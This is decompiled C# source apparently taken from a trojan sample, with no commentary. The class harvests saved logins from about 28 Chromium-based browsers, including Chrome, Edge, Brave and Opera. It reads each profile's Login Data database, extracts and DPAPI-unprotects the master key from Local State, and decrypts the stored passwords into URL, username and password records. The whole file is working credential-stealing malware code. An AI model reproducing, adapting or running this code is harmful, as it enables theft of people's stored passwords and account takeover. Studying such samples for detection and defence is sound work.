// Decompiled with JetBrains decompiler
// Type: pazuzu.ChromiumBased.Chromium
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using pazuzu.Required;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace pazuzu.ChromiumBased
{
  internal class Chromium
  {
    public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

    public static List<Account> Grab()
    {
      Dictionary<string, string> dictionary = new Dictionary<string, string>()
      {
        {
          "Chrome",
          Chromium.LocalApplicationData + "\\Google\\Chrome\\User Data"
        },
        {
          "Opera",
          Path.Combine(Chromium.ApplicationData, "Opera Software\\Opera Stable")
        },
        {
          "Yandex",
          Path.Combine(Chromium.LocalApplicationData, "Yandex\\YandexBrowser\\User Data")
        },
        {
          "360 Browser",
          Chromium.LocalApplicationData + "\\360Chrome\\Chrome\\User Data"
        },
        {
          "Comodo Dragon",
          Path.Combine(Chromium.LocalApplicationData, "Comodo\\Dragon\\User Data")
        },
        {
          "CoolNovo",
          Path.Combine(Chromium.LocalApplicationData, "MapleStudio\\ChromePlus\\User Data")
        },
        {
          "SRWare Iron",
          Path.Combine(Chromium.LocalApplicationData, "Chromium\\User Data")
        },
        {
          "Torch Browser",
          Path.Combine(Chromium.LocalApplicationData, "Torch\\User Data")
        },
        {
          "Brave Browser",
          Path.Combine(Chromium.LocalApplicationData, "BraveSoftware\\Brave-Browser\\User Data")
        },
        {
          "Iridium Browser",
          Chromium.LocalApplicationData + "\\Iridium\\User Data"
        },
        {
          "7Star",
          Path.Combine(Chromium.LocalApplicationData, "7Star\\7Star\\User Data")
        },
        {
          "Amigo",
          Path.Combine(Chromium.LocalApplicationData, "Amigo\\User Data")
        },
        {
          "CentBrowser",
          Path.Combine(Chromium.LocalApplicationData, "CentBrowser\\User Data")
        },
        {
          "Chedot",
          Path.Combine(Chromium.LocalApplicationData, "Chedot\\User Data")
        },
        {
          "CocCoc",
          Path.Combine(Chromium.LocalApplicationData, "CocCoc\\Browser\\User Data")
        },
        {
          "Elements Browser",
          Path.Combine(Chromium.LocalApplicationData, "Elements Browser\\User Data")
        },
        {
          "Epic Privacy Browser",
          Path.Combine(Chromium.LocalApplicationData, "Epic Privacy Browser\\User Data")
        },
        {
          "Kometa",
          Path.Combine(Chromium.LocalApplicationData, "Kometa\\User Data")
        },
        {
          "Orbitum",
          Path.Combine(Chromium.LocalApplicationData, "Orbitum\\User Data")
        },
        {
          "Sputnik",
          Path.Combine(Chromium.LocalApplicationData, "Sputnik\\Sputnik\\User Data")
        },
        {
          "uCozMedia",
          Path.Combine(Chromium.LocalApplicationData, "uCozMedia\\Uran\\User Data")
        },
        {
          "Vivaldi",
          Path.Combine(Chromium.LocalApplicationData, "Vivaldi\\User Data")
        },
        {
          "Sleipnir 6",
          Path.Combine(Chromium.ApplicationData, "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer")
        },
        {
          "Citrio",
          Path.Combine(Chromium.LocalApplicationData, "CatalinaGroup\\Citrio\\User Data")
        },
        {
          "Coowon",
          Path.Combine(Chromium.LocalApplicationData, "Coowon\\Coowon\\User Data")
        },
        {
          "Liebao Browser",
          Path.Combine(Chromium.LocalApplicationData, "liebao\\User Data")
        },
        {
          "QIP Surf",
          Path.Combine(Chromium.LocalApplicationData, "QIP Surf\\User Data")
        },
        {
          "Edge Chromium",
          Path.Combine(Chromium.LocalApplicationData, "Microsoft\\Edge\\User Data")
        }
      };
      List<Account> accountList = new List<Account>();
      foreach (KeyValuePair<string, string> keyValuePair in dictionary)
        accountList.AddRange((IEnumerable<Account>) Chromium.Accounts(keyValuePair.Value, keyValuePair.Key));
      return accountList;
    }

    private static List<Account> Accounts(string path, string browser, string table = "logins")
    {
      List<string> allProfiles = Chromium.GetAllProfiles(path);
      List<Account> accountList = new List<Account>();
      foreach (string str1 in allProfiles.ToArray())
      {
        if (File.Exists(str1))
        {
          SQLiteHandler sqLiteHandler;
          try
          {
            sqLiteHandler = new SQLiteHandler(str1);
          }
          catch (Exception ex)
          {
            continue;
          }
          if (sqLiteHandler.ReadTable(table))
          {
            for (int row_num = 0; row_num <= sqLiteHandler.GetRowCount() - 1; ++row_num)
            {
              try
              {
                string str2 = sqLiteHandler.GetValue(row_num, "origin_url");
                string str3 = sqLiteHandler.GetValue(row_num, "username_value");
                string str4 = sqLiteHandler.GetValue(row_num, "password_value");
                if (str4 != null)
                {
                  string str5;
                  if (str4.StartsWith("v10") || str4.StartsWith("v11"))
                  {
                    byte[] masterKey = Chromium.GetMasterKey(Directory.GetParent(str1).Parent.FullName);
                    if (masterKey != null)
                      str5 = Chromium.DecryptWithKey(Encoding.Default.GetBytes(str4), masterKey);
                    else
                      continue;
                  }
                  else
                    str5 = Chromium.Decrypt(str4);
                  if (!string.IsNullOrEmpty(str2) && !string.IsNullOrEmpty(str3) && !string.IsNullOrEmpty(str5))
                    accountList.Add(new Account()
                    {
                      URL = str2,
                      UserName = str3,
                      Password = str5,
                      Application = browser
                    });
                }
              }
              catch (Exception ex)
              {
              }
            }
          }
        }
      }
      return accountList;
    }

    private static List<string> GetAllProfiles(string DirectoryPath)
    {
      List<string> allProfiles = new List<string>()
      {
        DirectoryPath + "\\Default\\Login Data",
        DirectoryPath + "\\Login Data"
      };
      if (Directory.Exists(DirectoryPath))
      {
        foreach (string directory in Directory.GetDirectories(DirectoryPath))
        {
          if (directory.Contains("Profile"))
            allProfiles.Add(directory + "\\Login Data");
        }
      }
      return allProfiles;
    }

    public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
    {
      byte[] numArray1 = new byte[12];
      Array.Copy((Array) encryptedData, 3, (Array) numArray1, 0, 12);
      try
      {
        byte[] numArray2 = new byte[encryptedData.Length - 15];
        Array.Copy((Array) encryptedData, 15, (Array) numArray2, 0, encryptedData.Length - 15);
        byte[] numArray3 = new byte[16];
        byte[] numArray4 = new byte[numArray2.Length - numArray3.Length];
        Array.Copy((Array) numArray2, numArray2.Length - 16, (Array) numArray3, 0, 16);
        Array.Copy((Array) numArray2, 0, (Array) numArray4, 0, numArray2.Length - numArray3.Length);
        return Encoding.UTF8.GetString(new AesD().Decrypt(MasterKey, numArray1, (byte[]) null, numArray4, numArray3));
      }
      catch (Exception ex)
      {
        return (string) null;
      }
    }

    public static byte[] GetMasterKey(string LocalStateFolder)
    {
      string path = LocalStateFolder + "\\Local State";
      byte[] sourceArray = new byte[0];
      if (!File.Exists(path))
        return (byte[]) null;
      foreach (Match match in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path)))
      {
        if (match.Success)
          sourceArray = Convert.FromBase64String(match.Groups[1].Value);
      }
      byte[] numArray = new byte[sourceArray.Length - 5];
      Array.Copy((Array) sourceArray, 5, (Array) numArray, 0, sourceArray.Length - 5);
      try
      {
        return ProtectedData.Unprotect(numArray, (byte[]) null, DataProtectionScope.CurrentUser);
      }
      catch (Exception ex)
      {
        return (byte[]) null;
      }
    }

    public static string Decrypt(string encryptedData)
    {
      if (encryptedData == null || encryptedData.Length == 0)
        return (string) null;
      try
      {
        return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), (byte[]) null, DataProtectionScope.CurrentUser));
      }
      catch (Exception ex)
      {
        return (string) null;
      }
    }

    private static string DDecrypt(string data) => data == null ? (string) null : Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(data), (byte[]) null, DataProtectionScope.CurrentUser));
  }
}
